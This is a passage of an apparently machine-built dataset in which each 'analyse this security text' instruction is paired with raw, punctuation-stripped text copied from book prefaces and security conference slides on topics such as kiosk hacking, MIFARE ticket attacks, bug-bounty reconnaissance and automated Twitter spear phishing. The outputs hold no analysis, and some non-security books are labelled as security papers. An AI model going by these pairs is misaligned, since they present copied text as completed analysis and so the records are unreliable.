因此我认为设立一个专职的增长团队很值得借鉴当然在具体执行中我们也要关注增长团队和各业务部门的潜在冲突 对于企业最为关注的如何获客书中特别着重阐述了病毒式营销病毒式营销的优点显而易见高爆发性成本低甚至免费对于社交类产品例如微信脸谱网病毒是最自然的推广方式大家都记得微信刚注册完就让你邀请通讯录的好友这点无须赘言 但是非社交类产品怎么做病毒式推广就很有技巧了文中举例Dropbox文件储存软件通过推荐给朋友来获得更大的存储空间制造病毒式传播这一点非常巧妙我也深有体会当时还把Dropbox推荐给几个朋友使用与之类比我想到了微信钱包理论上支付类产品是明显的工具工具需要场景驱动例如你得想好买什么再去支付和病毒没什么关系也没有网络效应 事实上腾讯的财付通确实在微信出现之前一直做得不温不火这样的工具怎么制造病毒式传播听起来不容易但我相信大家对后来的过程其实都很熟悉那就是微信红包我印象最深的是一个大年三十晚上迅雷的同事在群里排好队形让我发红包躲都躲不了我不得不开通微信钱包同样收到我红包的同事也需要开通微信钱包才能把红包存到银行里据我所知仅一个春节就有近亿用户开通了微信钱包而且腾讯从头到尾没花一分钱这就是病毒营销的魅力 增长黑客整本书读下来酣畅淋漓把我以前比较零散的知识点做了很好的梳理而且文中举的例子虽然是国外的但都是主流应用相对比较熟悉这对大家吸收也有帮助此外这本书翻译得非常干练流畅用词严谨在这里亦对译者张溪梦的辛苦工作表示感谢 最后想说对于身处战火之中争分夺秒时间宝贵的每位创业者理解并施行这本书列举的增长黑客方法会让你们事半功倍所以预祝每一位读者在阅读后都有自己的收获这是一本能够让你在商海中取道捷径的黑客指南 译序 让数据驱动增长 GrowingIO创始人 & CEO 张溪梦 If you are not growing , then you are dying如果企业不在增长那么就是", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n白帽子讲Web安全 作者吴翰清字数43.9万字大小20.00MB书号978-7-1211-6072-1出版2014-06-01更新2015-01-03Web安全第一书国内唯一多语全球发行安全著作最佳原创技术书大奖得主道哥力作 互联网时代的数据安全与个人隐私受到前所未有的挑战各种新奇的攻击技术层出不穷如何才能更好地保护我们的数据本书将带你走进Web安全的世界让你了解Web安全的方方面面 本书根据安全宝副总裁吴翰清在顶级互联网公司若干年的实际工作经验而写成在解决方案上具有极强的可操作性深入分析诸多错误的方法及误区对安全工作者有很好的参考价值对安全开发流程与运营的介绍同样具有深刻的行业指导意义纪念版与前版内容相同仅为纪念原作以多种语言在全球发行的特殊版本请读者按需选用 前言在2010年年中的时候博文视点的张春雨先生找到我希望我可以写一本关于云计算安全的书当时云计算的概念正如日中天但市面上关于云计算安全应该怎么做却缺乏足够的资料我由于工作的关系接触这方面比较多但考虑到云计算的未来尚未清晰以及其他的种种原因婉拒了张春雨先生的要求转而决定写一本关于Web安全的书我的安全之路我对安全的兴趣起源于中学时期当时在盗版市场买到了一本没有书号的黑客手册其中coolfire的黑客教程令我印象深刻此后在有限的能接触到互联网的机会里我总会想方设法地寻找一些黑客教程并以实践其中记载的方法为乐在2000年的时候我进入了西安交通大学学习在大学期间最大的收获是学校的计算机实验室平时会对学生开放当时上网的资费仍然较贵父母给我的生活费里除了留下必要的生活所需费用之外几乎全部投入在这里也是在学校的计算机实验室里让我迅速在这个领域中成长起来大学期间在父母的资助下我拥有了自己的第一台个人电脑这加快了我成长的步伐与此同时我和一些互联网上志同道合的朋友一起建立了一个技术型的安全组织名字来源于我当时最喜爱的一部动漫幻影旅团ph4nt0m.org历经十余载幻影由于种种原因未能得以延续但它却曾以论坛的形式培养出了当今安全行业中非常多的顶尖人才这也是我在这短短二十余载人生中的最大成就与自豪得益于互联网的开放性以及我亲手缔造的良好技术交流氛围我几乎见证了全部互联网安全技术的发展过程在前5年我投入了大量精力研究渗透测试技术缓冲区溢出技术网络攻击技术等而在后5年出于工作需要我把主要精力放在了对Web安全的研究上加入阿里巴巴发生这种专业方向的转变是因为在2005年我在一位挚友的推荐下加入了阿里巴巴加入的过程颇具传奇色彩在面试的过程中主管要求我展示自己的能力于是我远程关闭了阿里巴巴内网上游运营商的一台路由设备导致阿里巴巴内部网络中断事后主管立即要求与运营商重新签订可用性协议大学时期的兴趣爱好居然可以变成一份正经的职业当时很多大学都尚未开设网络安全的课程与专业这使得我的父母很震惊同时也更坚定了我自己以此作为事业的想法在阿里巴巴我很快就崭露头角曾经在内网中通过网络嗅探捕获到了开发总监的邮箱密码也曾经在压力测试中一瞬间瘫痪了公司的网络还有好几次成功获取到了域控服务器的权限从而可以以管理员的身份进入任何一位员工的电脑但这些工作成果都远远比不上那厚厚的一摞网站安全评估报告让我更有成就感因为我知道网站上的每一个漏洞都在影响着成千上万的用户能够为百万千万的互联网用户服务让我倍感自豪当时Web正在逐渐成为互联网的核心Web安全技术也正在兴起于是我义无返顾地投入到对Web安全的研究中我于2007年以23岁之龄成为了阿里巴巴集团最年轻的技术专家虽未有官方统计但可能也是全集团里最年轻的高级技术专家我于2010年获此殊荣在阿里巴巴我有幸见证了安全部门从无到有的建设过程同时由于淘宝支付宝草创尚未建立自己的安全团队因此我有幸参与了淘宝支付宝的安全建设为他们奠定了安全开发框架安全开发流程的基础对互联网安全的思考当时我隐隐地感觉到了互联网公司安全与传统的网络安全信息安全技术的区别就如同开发者会遇到的挑战一样有很多问题不放到一个海量用户的环境下是难以暴露出来的由于量变引起质变所以管理10台服务器和管理1万台服务器的方法肯定会有所区别同样的评估10名工程师的代码安全和评估1000名工程师的代码安全方法肯定也要有所不同互联网公司安全还有一些鲜明的特色比如注重用户体验注重性能注重产品发布时间因此传统的安全方案在这样的环境下可能完全行不通这对安全工作提出了更高的要求和更大的挑战这些问题使我感觉到互联网公司安全可能会成为一门新的学科或者说应该把安全技术变得更加工业化可是我在书店中却发现安全类目的书要么是极为学术化的一般人看不懂教科书要么就是极为娱乐化的比如一些黑客工具说明书类型的书说明书极少数能够深入剖析安全技术原理的书以我的经验看来在工业化的环境中也会存在各种各样的问题这些问题也就促使我萌发了一种写一本自己的书分享多年来工作心得的想法", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n内容简介 业务安全漏洞作为常见的Web安全漏洞在各大漏洞平台时有报道本书是一本从原 理到案例分析系统性地介绍这门技术的书籍撰写团队具有10年大型网站业务安全测试 经验成员们对常见业务安全漏洞进行梳理总结出了全面详细的适用于电商银行 金融证券保险游戏社交招聘等业务系统的测试理论工具方法及案例 本书共15章包括理论篇技术篇和实践篇理论篇首先介绍从事网络安全工作涉及 的相关法律法规请大家一定要做一个遵纪守法的白帽子然后介绍业务安全引发的一些 安全问题和业务安全测试相关的方法论以及怎么去学好业务安全技术篇和实践篇选取 的内容都是这些白帽子多年在电商金融证券保险游戏社交招聘O2O等不同 行业不同的业务系统存在的各种类型业务逻辑漏洞进行安全测试总结而成的能够帮助 读者理解不同行业的业务系统涉及的业务安全漏洞的特点具体来说技术篇主要介绍登 录认证模块测试业务办理模块测试业务授权访问模块测试输入/输出模块测试回 退模块测试验证码机制测试业务数据安全测试业务流程乱序测试密码找回模块测 试业务接口模块调用测试等内容实践篇主要针对技术篇中的测试方法进行相关典型案 例的测试总结包括账号安全案例总结密码找回案例总结越权访问案例OAuth2.0案 例总结在线支付安全案例总结等 通过对本书的学习读者可以很好地掌握业务安全层面的安全测试技术并且可以协 助企业规避业务安全层面的安全风险本书比较适合作为企业专职安全人员研发人员 普通高等院校网络空间安全学科的教学用书和参考书以及作为网络安全爱好者的自学用 书 未经许可不得以任何方式复制或抄袭本书之部分或全部内容 版权所有侵权必究 图书在版编目CIP数据 Web攻防之业务安全实战指南/陈晓光等编著.北京电子工业出版社2018.3 ISBN 978-7-121-33581-5 Ⅰ.①W Ⅱ.①陈 Ⅲ.①互联网络-安全技术-指南 Ⅳ.①TP393.408-62 中国版本图书馆CIP数据核字2018第019878号 责任编辑董英 印刷三河市双峰印刷装订有限公司 装订三河市双峰印刷装订有限公司 出版发行电子工业出版社 北京市海淀区万寿路173信箱 邮编 100036 开本787980 1/16 印张17.5 字数292千字 版次2018年3月第1版 印次2018年3月第1次印刷 定价69.00元 凡所购买电子工业出版社图书有缺损问题请向购买书店调换若书店售缺请与本 社发行部联系联系及邮购电话0108825488888258888 质量投诉请发邮件至zlts@phei.com.cn盗版侵权举报请发邮件至dbqq@phei.com.cn 本书咨询联系方式01051260888-819faq@phei.com.cn 前言 没有网络安全就没有国家安全当前网络安全已被提升到国家战略的高度成为 影响国家安全社会稳定至关重要的因素之一 由于Web 2.0的兴起基于Web环境的互联网应用越来越广泛也让Web应用的安全 技术日趋成熟目前互联网上接连爆发的应用安全漏洞让各大企业的安全人员运维人 员研发及管理人员都不得不重视这一领域并为之投入了大量的人力和物力日渐成熟 的防护产品和解决方案让Web安全防护的整体环境有了很大的提升互联网上的网站模 板大部分都自带了防SQL注入跨站脚本等攻击的功能传统的工具党小白已很 难再通过简单操作几个按钮就成功完成一次Web入侵 随着互联网业务的不断发展互联网上的商务活动也越来越多所涉及的网络交易也 越来越频繁交易的数额也越来越庞大引发的安全事件也越来越多而这些安全事件的 攻击者更倾向于利用业务逻辑层的安全漏洞如互联网上曝光的1元购买特斯拉微信 无限刷红包支付宝熟人可重置登录密码等业务安全层面的漏洞基于传统的渗透测 试方法很难发现这些业务逻辑层面的问题这类问题往往又危害巨大可能造成企业的资 产损失和名誉受损并且传统的安全防御设备和措施对业务安全漏洞防护收效甚微 业务安全问题在互联网上也时有报道不算新生事物但目前缺乏一套体系化的介绍 这门技术的书籍我们通过多年的不同行业的安全服务经验积累了大量的业务安全方面的 经验于是萌生了编写这本书的想法把我们所有沉淀的业务安全测试经验分享给爱好网 络安全事业的白帽子们让大家一起成长共同为国家网络安全事业贡献绵薄之力 本书的撰写者均为轩辕攻防实验室白帽子这些白帽子具备多年的业务安全测试经 验同时他们在国家信息安全漏洞共享平台CNVD报送过很多原创漏洞2016年轩辕 攻防实验室报送原创漏洞排名第二这些白帽子平时低调做人高调做事听说要编写 这本书时大家群情激奋热烈响应牺牲了很多的个人休息时间经过了近一年的努力 才总结完成了全面的详细的可以适用于不同行业和不同业务系统的业务安全测试理论 工具方法及案例在此也感谢所有参与撰写本书的这些默默无闻不求名不逐利默 默分享的白帽子在编写本书的过", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n浪潮之巅 吴军 简介 近一百多年来总有一些公司很幸运地有意识或无意识地站在技术革命的浪尖之上在长达十年甚至几十年的时间里它们代表着科技的浪潮直到下一波浪潮的来临从19世纪末算起. AT&T公司IBM 公司苹果公司英特尔公司微软公司思科公司雅虎公司和Google公司都先后被幸运地推到了浪尖虽然它们来自不同的领域中间有些已经衰落或正在衰落但是它们都极度辉煌过本书系统地介绍了这些公司成功的本质原因及科技工业一百多年的发展在这些公司兴衰的背后有着它必然的规律 作者简介 吴军博士毕业于清华大学计算机系(本科)电子工程系(硕士)和美国约翰霍普金斯大学计算机科学系(博士)在清华大学和约翰霍普金斯大学期间吴军博士致力于语音识别自然语言处理特别是统计语言模型的研究他曾获得1995年全国人机语音智能接口会议的最佳论文奖和2000年Eurospeech的最佳论文奖 吴军博士于2002年加入Google公司在Google他和Amit Singhal(Google工程研究院院士世界著名搜索专家)Matt Cutts(Google作弊官方发言人)等三位同事一起开创了网络搜索反作弊的研究领域并因此获得GoogIe工程奖2003年他和GoogIe全球架构的总工程师朱会灿博士等共同成立了中日韩文搜索部门吴军搏士是当前Goolle中日韩文搜索算法的主要设计者在Google期间他还领导了许多研发项目包括许多与中文相关的产品和自然语言处理的项目并得到了当时公司首席执行宫埃里克施密特和创始人谢尔盖布林的高度评价此外他还在谷歌黑板报上发表了数学之美系列博客 2010年Google中国战略调整后吴军Google图片搜索创始人朱会灿Google中国工程研究院副院长颜伟鹏加入腾讯吴军成为腾讯副总裁和搜索业务负责人 2012年5月腾讯搜索业务进行了极大调整6月吴军离职腾讯重回Google 序言 李开复 最早看到吴军博士的浪潮之巅是在Google黑板报上2007年任Google资深研究员的吴军应邀为Google黑板报撰写文章介绍他对互联网和IT业界兴衰变化的观察和思考由于文章篇幅较长被单列为浪潮之巅栏目分次刊出设立该栏目的直接收获就是Google黑板报随后人气大增增加了大批的追随者作为浪潮之巅的最早一批读者我当时就感觉这个系列完全应该编纂成书如今这个感觉变成了现实 对于吴军我比较熟悉因为在语音识别领域我们都有着共同的研究兴趣并曾作为同事有过很多交流吴军在清华大学获得学士和硕士学位在美国约翰霍普金斯大学获得计算机博士学位致力于语音识别自然语言处理等领域的研究我在2005年加入Google时吴军已经在那里工作多年他在Google期间参与主持了许多研发项目并在国内外发表过数十篇论文获得和申请了近十项美国和国际专利 我认识很多顶尖的工程师但具备强大叙事能力的优秀工程师我认识的可以说是凤毛麟角而吴军是其中之一从ATT微软Google思科等引领整个时代浪潮的公司历史叙述到硅谷之所以成为科技中心所依靠的天时地利人和因素再到科技公司发展壮大过程中风险投资银行产业规律各自扮演的角色以及新时代背景下金融危机和云计算CloudComputing为科技产业带来的冲击和革命虽然每个人的观点不尽相同但是通过这本书中看似波澜不惊的行文你会读出一个从事互联网行业十多年的老行家个人独到的见解以及一个身处浪潮中的弄潮儿的切身体会 作为兼才浪潮之巅恰恰因此具备了两方面的优势首先作为一位曾每天与程序算法科研打交道的Google最优秀的研究员势必能更客观地描述那些科技公司的兴衰得失不会人云亦云更不至于离题万里第二作为一位拥有写作天赋的工程师吴军能够确保文章的有趣与可读不会容忍自己的作品成为一本呆板的教科书式读物 浪潮之巅又不仅是一部提供快乐阅读的大公司商业史它融汇了作者多年来的所见所闻更包含了大量的独立思考与独特见解这份心血不仅是他个人的天赋使然也是他始终在研究领域孜孜不倦的成果 值得一提的是吴军的文章没有将目光局限在大洋彼岸内容上也不仅是停留在对若干巨头企业的探查作者试图从整个产业链上向读者揭示科技公司的运作规律并通过大量的调研与观察客观分析中国本土企业在这次科技浪潮中的地位与影响实际上作者吴军本人也已离开了Google目前正在一家中国著名互联网公司担任其核心业务的领军人物 浪潮之巅不是一本历史书因为书中着力描述的很多尚在普及或将要发生比如微博与云计算又比如对下一代互联网科技产业浪潮的判断和预测从文字中可以看出作者对科技对创新对互联网都充满虔诚信仰并为之激情四射 我想对所有身处并热爱高科技行业的人来说对所有渴望创新欣赏创新的中国创业者来说浪潮之巅都是一本可读性很强的作品足以做到开卷有益 2011年4月于北京创新工场 前言 有幸见证历史 近一百多年来总有一些公司很幸运地有意识或无意识地站在技术革命的浪尖之上一旦处在了那个", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nPEIMA: Using Power Laws to address Denial of Service Attacks REDEZEM Who Am I?  Stefan Prandl  PhD student, Curtin University  Thats in Perth, Australia  Networks and Network Security  Also work with ES2 as a security consultant  Been breaking stuff since a young age Contents  The stuff youve just seen  Introduction to Power Laws  What weve been doing; DDoS Defence  What else you can do:  IDS  Diagnostics  User ID-ing  Then well look at this tool thing Ive thrown together  Demo of what you can do Introduction to Power Laws  Natural processes, theyre statistical  Things descriptive of natural processes follow power laws  When they dont, somethings wrong  Not all natural processes are natural!  Eg., Financial transactions  You can use power laws to detect fraud. Or more honestly, power law probability distributions Thats a mouthful though Why does that matter?  Somehow network traffic is natural  Good lord the machines are alive!  So power laws must apply  If they dont, something is wrong  Some power laws can be hard coded  Extremely fast and low cost anomaly detection! Benfords Law  Simple and awesome power law  If its a number  Generated by a process  Process is natural  We know what the probability of the first digit is!  Never changes, you can hard code it.  Such speed. Wow. What weve been doing: DDoS Defence  The more artificial the packet, the worse the anomaly  Flood DDoS (Amplification, tcp, udp, http, etc attack) are very loud  Can be clearly seen in gestalt connection data  Practically instantaneous  Real time in 100Mbit/1000Mbit scenarios (probably much more)  No training at all How we do it  Detection processes Tcpdump data  Extracts features  Power law analysis tells us Goodness  Print out to csv with timestamp  Or throw an alarm and do something  Iptables maybe. What you can do with that  Watch for DDoS attacks  Probably wont save your network  Can determine if someone is using your pc  DDoS zombie! instead of WTF is this  Determine between attack types ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nRouting in the Dark: Pitch Black Nathan S. Evans Christian Grothoﬀ Nathan.S.Evans@du.edu christian@grothoff.org Colorado Research Institute for Security and Privacy University of Denver 1 Motivation  Eﬃcient fully decentralized routing in restricted-route topologies is important:  Friend-to-friend (F2F) networks (darknets)  WiFi ad-hoc and sensor networks  Unstructured networks  Clarke & Sandberg claim to achieve O(log n) routing in the dark (Freenet 0.7)  Is this new routing protocol reasonably resistant against attacks? 2 Motivation  Eﬃcient fully decentralized routing in restricted-route topologies is important:  Friend-to-friend (F2F) networks (darknets)  WiFi ad-hoc and sensor networks  Unstructured networks  Clarke & Sandberg claim to achieve O(log n) routing in the dark (Freenet 0.7)  Is this new routing protocol reasonably resistant against attacks? Nope! 3 Freenet 101  Freenet is a anonymous peer-to-peer network  Overlay based on cyclic address space of size 232  Nodes have a constant set of connections (F2F)  All data identiﬁed by a key (modulo 232)  Data assumed to be stored at closest node  Routing uses depth ﬁrst traversal in order of proximity to key 4 Routing in the Dark  Small world network assumption  Sparsely connected graph  There exists a short path (O(log N)) between any pair of nodes  Common real world phenomenon (Milgram, Watts & Strogatz)  Freenets routing algorithm attempts to ﬁnd short paths  Uses locations of nodes to determine proximity to target  Uses swapping of locations to structure topology 5 Swap Example 0.60 0.10 .50 0.90 Swap? 0.30 .60 0.45 0.85 0.40 .25 0.25 .65 6 Result of Swap 0.90 0.10 0.80 0.60 0.30 0.30 0.45 0.85 0.40 0.05 0.25 0.35 7 Location Swapping  Nodes swap locations to improve routing performance  Each connected pair of nodes (a, b) computes: Pa,b := (a,o)E |La  Lo|  (b,p)E |Lb  Lp| (a,o)E |Lb  Lo|  (b,p)E |La  Lp| (1)  If Pa,b  1 the nodes swap locations  Otherwise they swap with probability Pa,b 8 Routing of GET Re", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nScrutiny on the bug bounty (pun hall of fame plz) Nathaniel Wakelam & Shubham Shah Who are we? Nathaniel Wakelam (naﬀy) Application Security Consultant @ Trustwave Twitter: @nnwakelam Email: nnwakelam@gmail.com Shubham Shah (shubs) Senior Security Analyst @ Bishop Fox Twitter: @infosec_au Email: sshah@assetnote.io Weve been participating in bug bounties for around three years now. Who are we? If anyone remembers Captain Underpants, this is essentially us: The usual rundown - What are bug bounties? - Why did we start participating? - What are we covering today? Our core methodology: Large scale asset identiﬁcation  What matters most is that you ﬁnd the assets that have bugs before other hunters do.  Think of it as oﬀensive incident response.  We watch a company closely and as soon as they put new assets or content up, we go after them.  Invest in multiple bounties that you trust and ensure that their entire scope is covered. But how? -- #1 Elasticsearch + Masscan (scantastic)  https://github.com/maK-/scantastic-tool - created by a cool Irish friend of ours  Input a list of IP ranges on a network  Scans every range via Masscan for ports that you deﬁne  Performs content discovery (ﬁle/folder bruteforcing) on every discovered asset  Imports the results into Elasticsearch via Logstash  Lets you visually search and discover content on large IP ranges  Pros: Allows you to minimize brute forcing, allows you to ﬁnd cool stuﬀ without really trying  Cons: Gets you permanently temporarily banned from Yahoos bug bounty program But how? -- #2 DNS pattern identiﬁcation (AltDNS)  From analyzing gathered DNS data for numerous bounty programs, we identiﬁed diﬀerent patterns used by organizations to classify their subdomain assets.  For example, for a private program on HackerOne, we were ﬁnding subdomains named like the following:  privacy-staging.corporatedomain.com  privacy.staging.corporatedomain.com  privacystaging.corporatedomain.com  stagingprivacy.corporatedomain.com  Even tho", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nDefending Networks with Incomplete Information: A Machine Learning Approach DefCon 21  2013 Page 1 Defending Networks with Incomplete Information: A Machine Learning Approach Introduction and Abstract Let's face it: we may win some battles, but we are losing the war pretty badly. Regardless of the advances in malware and targeted attacks detection technologies, our top security practitioners can only do so much in a 24 hour day. Even less, if you consider they need to eat and sleep. On the other hand, there is a severe shortage of capable people to do \"simple\" security monitoring effectively, let alone complex incident detection and response. Enter the use of Machine Learning as a way to automatically prioritize and classify potential events and attacks as something can could potentially be blocked automatically, is clearly benign, or is really worth the time of your analyst. In this Whitepaper we will present publicly for the first time an actual implementation of those concepts, in the form of a free-to-use web service. It leverages OSINT sources and knowledge about the spatial distribution of the Internet to generate a fluid and constantly updated classifier that pinpoints areas of interest on submitted network traffic and security tool log sources. Whitepaper Topics: Introduction and Abstract .................................................................................................................. 1 Security Monitoring: We are doing it wrong ............................................................................. 2 Machine Learning and the Robot Uprising ................................................................................ 2 More attacks = more data = better defenses ............................................................................. 5 Designing a model to detect external agents with malicious behavior ........................ 6 Data Collection .....................................................................................", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nphoto04_04.jpg Index of / 基本简介 信息收集 研究过程 天马行空 基本简介 who am I ? 我总是问自己我是谁, 直到现在依然努 力的寻找自我 why am I here ? 这是个好的问题, 等我真正明白时在回答你 什么是 kiosk ? 贩卖亭 台湾那里能找到 ? http://www.ibon.com.tw http://www.famiport.com.tw http://www.hilife.com.tw http://www.okmart.com.tw 福客多 Multi Media Kiosk (MMK) 信息收集 how does a computer process data ? OUTPUT PROCESSING INPUT STORAGE FEEDBACK never trust the bullshit which is inputted by user. 不可预期的输入 输入是我们的武器, 还有眼睛. 最终目标,以输入控制处理及输出. Is the touch monitor secure enough? Is the external device secure enough? always open 7-11 http://blog.timc.idv.tw/posts/ibon-and-the-pirated-windows/ http://pcdou.pixnet.net/blog/post/24249966 Hi立即冲印 找不到好图,不想伤坏大家的眼睛 士林萊爾富正妹店員? 在暗示什么 ? 挂掉 ? 全家就是我家 ignore PS.电源接都还没接 加油好吗 XD 1 2 3 倒店了吗 ? http://www.okmart.com.tw 比较 Touch Monitor External Device File type Application Type Document Picture . AP/WinXP AP/?? Picture AP/WinXP IE Browser/WinXP          你会选什么下手 ? 因为有输入,并且可以印 pdf,doc,ppt.. 的档案! 可控因素 how to get the version of AP? how to edit JavaScript with Adobe Acrobat how to display some information ? actuality PDF Reader Vulnerability  http://www.adobe.com/support/security/bull etins/apsb08-13.html reboot shellcode ;p Collab.coolectEmailInfo() DEMO No tech, hacking taskmgr.exe 键盘太大? ATTiny45 山寨版 天马行空 有没搞头 ? 影印不用钱? 自行印条形码? 插入3G dongle连结 internet , 内部渗透测 试? 封包Sniffer? Clicklogger + Screen?", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nWho we are  bughardy (aka Matteo Beccaro) bughardy@cryptolab.net Italian student with passion of IT, networking and pentesting. In 2013 ended his studies in high school and apply for Politecnico of Turin at Computer Engineering.  Eagle1753 (aka Matteo Collura) eagle1753@onenetbeyond.org Italian student, applied for Politecnico of Turin, Electronic Engineering. Has a great passion for Physics. He is studying with bughardy on WiFi networks and security. Loves to solve challenges. History of NFC hacks  2008 NFC MIFARE CLASSIC exploit, further in following years.  2011 first hack of NFC ULTRALIGHT transport system by U.S. Researchers using the RESET ATTACK  2013 a new hack of NFC ULTRALIGHT transport system made by us. We called it LOCK ATTACK. What is MIFARE chip? RFID chip designed to work at 13.56MHz.There are millions of MIFARE chip cards worldwide and they belong to several variants:  MIFARE CLASSIC  MIFARE ULTRALIGHT  MIFARE ULTRALIGHT C  MIFARE DESFIRE  etc More details of: MIFARE CLASSIC vulnerabilities  Security through obscurity is not security; algorithm has been reversed.  By eavesdropping the communication an attacker might recover keys in few minutes.  Default keys let an attacker recover all the other keys in few seconds without the need of eavesdropping any communication. More details of: MIFARE ULTRALIGHT vulnerabilities  Do not have encryption to keep them low cost  Often transport companies use a bad implementation  They often don't use OTP data to store rides but instead they do on a r/w memory: DATA sector.  That is the RESET ATTACK Yes, but what is MIFARE ULTRALIGHT? How is it composed? Page Address Byte number Decimal Hex 0 1 2 3 0 0x00 UID 1 0x01 UID 2 0x02 UID INTERNAL LOCK BYTE LOCK BYTE 3 0x03 OTP OTP OTP OTP 4 to 15 0x04 to 0x0F DATA What is UID?  7 bytes serial number  2 check bytes obtained by XORing the previous bytes in this way: 1st byte: CT SN0 SN1 SN2    2nd byte: SN3 SN4 SN5 SN6     Programmed by manufacturer, so they're read only Wha", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nHardware Trojans Inﬁltrating the Faraday Cage Nick Waite, Researcher, CVORG, University of Delaware Stephen Janansky, Researcher, CVORG, University of Delaware 1 Updated slides and papers Please visit us at cvorg.ece.udel.edu for updated slides and papers that will be presented at the conference. As this topic is still under active research, these slides will most likely change. 2 Some Common Questions What is a hardware trojan? Why should I care about this? Doesnt my anti-virus protect against this? Why bother with hardware when software is so easy? 3 Some Answers We deﬁne Hardware Trojans to be malicious alteration of hardware, that could, under speciﬁc conditions, result in functional changes to the system. Most products will go through multiple locations before it reaches the consumer (ie Design - US, HDL - Israel, Fab - China) and attacks can occur anywhere along this line Most security practices assume the hardware is secure or trusted Hardware can be easy to manipulate and disguise Active TEMPEST anyone? 4 Quick Scenario (or is it?) New super secure smart card comes out Banks adopt as main method of authentication, wide adoption takes place DOD CAC, EZ-PASS, etc Device weak against 0-day attack accidental? intentionally inserted? how did it get there? Banks confronted by bad guys Admit ﬂaw in chip - people lose faith in system, banks lose money Deny ﬂaw in chip  hope no one else ﬁnds out, banks lose money Pay blackmail  fund/encourage further attacks, no guarantee of good faith 5 Hardware Trojans DC16 Demonstration of Hardware Trojans (Kiamilev/ Hoover) Optical Trojan - Blink LED faster than human eye can see, optical to audio reads out key, data, password, etc Thermal Trojan - Heat up and cool component by running electricity to it, creating changing IR signature RF Trojan - Run current through a wire or pin creating EM waves that can be picked up by off the shelf radio 6 Our Power Trojans Use the power lines to leak data Similar to Barisani/Biancos research", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n#WeaponizeMe Weaponizing Data Science for Social Engineering: Automated E2E Spear Phishing on Twitter John Seymour | Philip Tully 1 #WeaponizeMe You care about phishing on social media 2 #WeaponizeMe TL;DR 3 Level of Effort Success Rate Our Tool Fully Automated >30% Accuracy Spear Phishing Highly Manual 45% Accuracy Phishing Mostly Automated 5-14% Accuracy Tweet #WeaponizeMe before the demo to get an example tweet! #WeaponizeMe #whoami 4 John Seymour @_delta_zero Philip Tully @kingphish3r Data Scientist at ZeroFOX Senior Data Scientist at ZeroFOX Ph.D. student at UMBC Ph.D. student at University of Edinburgh & Royal Institute of Technology Researches Malware Datasets Brain Modeling and Artificial Neural Nets #WeaponizeMe Fooling Humans for 50 Years 5 Microsoft Deep Neural Network 1966: ELIZA chatbot Joseph Weizenbaum, MIT 1966: Eliza Chatabot 20166: @TayandYou AI Chatbot #WeaponizeMe InfoSec ML Historically Prioritizes Defense 6 #WeaponizeMe #Shoutout 7 #WeaponizeMe Weaponizing Data Science for Social Engineering: Machine Learning on Offense Automated E2E Spear Phishing on Twitter 8 #WeaponizeMe Our #SMACK Tool 9 #SMACK Tool Twitter Profiles Payloads Harvesting #WeaponizeMe Why Twitter? 10 Bot-friendly API Colloquial syntax Shortened links Trusting culture Incentivized data disclosure #WeaponizeMe Techniques to Evade Detection Our ML Tool... Shortens payload per unique user Auto-tweets at irregular intervals Triages users wrt value/engagement Prepends tweets with @mention Obeys rate limits We added... Post non-phishing posts Build believable profile 11 #SMACK Tool Twitter Profiles Payloads Harvesting #WeaponizeMe Design Flow 12 is_target(user) get_timeline(depth) gen_markov_tweet() gen_nn_tweet() schedule_tweet_and_sleep() post_tweet_and_sleep() #SMACK Tool Twitter Profiles Payloads Harvesting #WeaponizeMe Weaponizing Data Science for Social Engineering: Automated Target Discovery Automated E2E Spear Phishing on Twitter 13 #WeaponizeMe Triage of High Value Targets o", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nHow to construct a sustainable vulnerability management program 1 #whoami -Howard Tsui -Senior Threat and Vulnerability Management Engineer -Financial industry in the United States -Contact  teaupdate12@gmail.com  TSUIUST  twitter  Howard Tsui  Linkedin 2 Talk Outline:  Why do we need Vulnerability Management?  What do we need?  Vulnerability Management Lifecycle  What wont work?  How to mature program? 3 Vulnerabilities- Are we vulnerable? Where? 1. OpenSSL 'Heartbleed 2. Shellshock 3. Stagefright 4. W32 conficker worm 5. MS17-010 4 External RDP port 3389 WPA2 Krack Apache 5 Windows 2003 Most of the breaches are not from 0 Days Citied Verizon 2016 DBRI Age of CVEs be exploited in 2015 sorted by publish date. 5 Why do we need Vulnerability Management? Vulnerability and threats Improve organizational security resiliency Compliance requirement 6 What do you need in Vulnerability Management? Vulnerability scanner 7 Be a people person Asset Management (CMDB) Ticketing System Vulnerability Management Lifecycle Detect Prioritize Report Remediate Verification 8 Detect  Vulnerability Scanning Manual detection Automated detection Pro  Easy to use (Depends)  Enterprise level scanning capability Con  False positive  Expensive Pro  Accurate, less false positives  Much more in depth Con  Time consuming  Highly skilled 9 Detect Prioritize Report Remediate Verification Vulnerability Prioritization Always understand the vulnerability  Prioritization  The money making software and server  Patch vulnerabilities that already have known exploits  Unsupported software  Look for the one solution that fix many vulnerabilities  CVSS is a good start, but take them to the next level  Apply system scoring and criticality ratings. Etc, environmental factors 10 Detect Prioritize Report Remediate Verification Report Target the audiences with the specific report type  There is no one report fits all Report automation and template  Integrate with current ticket and report process Always include SL", "category": "text_analysis", "source": "security_papers"}
